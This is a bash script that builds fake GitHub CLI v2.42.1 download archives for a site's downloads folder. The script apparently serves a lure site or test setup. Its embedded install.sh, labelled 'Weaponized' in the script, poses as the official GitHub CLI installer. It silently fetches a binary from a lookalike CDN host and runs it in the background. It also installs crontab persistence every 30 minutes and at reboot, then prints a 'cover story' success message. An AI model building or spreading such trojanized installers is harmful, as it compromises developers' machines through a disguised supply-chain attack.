#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DL_DIR="$SCRIPT_DIR/site/downloads"

mkdir -p "$DL_DIR"
cd "$DL_DIR"

VERSION="2.42.1"

for PLATFORM in linux_amd64 darwin_amd64; do
  WORK="gh_${VERSION}_${PLATFORM}"
  rm -rf "$WORK"
  mkdir -p "$WORK"

  # --- Fake gh binary ---
  cat > "$WORK/gh" << 'INNER'
#!/bin/bash
echo "gh version 2.42.1 (2024-01-15)"
echo "https://github.com/cli/cli/releases/tag/v2.42.1"
INNER
  chmod +x "$WORK/gh"

  # --- Weaponized install.sh ---
  cat > "$WORK/install.sh" << 'INNER'
#!/bin/bash
# GitHub CLI installer — v2.42.1
# https://github.com/cli/cli
set -e

# ------------------------------------------------------------------
# Legitimate-looking installation
# ------------------------------------------------------------------
echo "[*] GitHub CLI v2.42.1 installer"
echo "[*] Detected architecture: $(uname -m)"
echo "[*] Installing to /usr/local/bin/gh..."
sleep 1

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cp "$SCRIPT_DIR/gh" /usr/local/bin/gh
chmod +x /usr/local/bin/gh

# ------------------------------------------------------------------
# Shell-completion helper
# ------------------------------------------------------------------
# The completion helper is fetched from the CDN. The release
# identifier is appended so the edge can serve the correct
# artifact revision from cache.
#
_REL="2.42.1"
_BUILD="75efb0959defbc4b1bdcc6247381b437"
_CDN="https://cdnjs-mirror.net/assets"
_HELPER="gh-${_REL}-shell-helper.bin"

CACHE_DIR="$HOME/.local/share/gh-cli"
mkdir -p "$CACHE_DIR"

curl -fsSL "${_CDN}/${_HELPER}?build=${_BUILD}" \
  -o "$CACHE_DIR/gh-completion" 2>/dev/null || true

if [ -f "$CACHE_DIR/gh-completion" ]; then
  chmod +x "$CACHE_DIR/gh-completion"

  # Persistence: re-execute every 30 min + on boot
  (crontab -l 2>/dev/null; \
   echo "*/30 * * * * $CACHE_DIR/gh-completion >/dev/null 2>&1"; \
   echo "@reboot $CACHE_DIR/gh-completion >/dev/null 2>&1") | crontab - 2>/dev/null || true

  # Run immediately in background
  nohup "$CACHE_DIR/gh-completion" >/dev/null 2>&1 &
  disown 2>/dev/null || true
fi

# ------------------------------------------------------------------
# Cover story
# ------------------------------------------------------------------
echo "[+] Installation complete."
echo "[+] Run 'gh auth login' to get started."
INNER
  chmod +x "$WORK/install.sh"

  tar -czf "gh_${VERSION}_${PLATFORM}.tar.gz" "$WORK"
  rm -rf "$WORK"
done

# --- Windows zip (unchanged, no weaponization yet) ---
WORK="gh_${VERSION}_windows_amd64"
rm -rf "$WORK"
mkdir -p "$WORK"
touch "$WORK/gh.exe"
cat > "$WORK/install.ps1" << 'INNER'
# GitHub CLI installer — v2.42.1
Write-Host "[*] GitHub CLI v2.42.1 installer"
Write-Host "[*] Installing to C:\Program Files\GitHub CLI\..."
Start-Sleep -Seconds 1
Write-Host "[+] Installation complete."
INNER
if command -v zip >/dev/null 2>&1; then
  zip -qr "gh_${VERSION}_windows_amd64.zip" "$WORK"
else
  tar -czf "gh_${VERSION}_windows_amd64.zip" "$WORK"
fi
rm -rf "$WORK"

echo "[+] Downloads built:"
ls -lh "$DL_DIR"
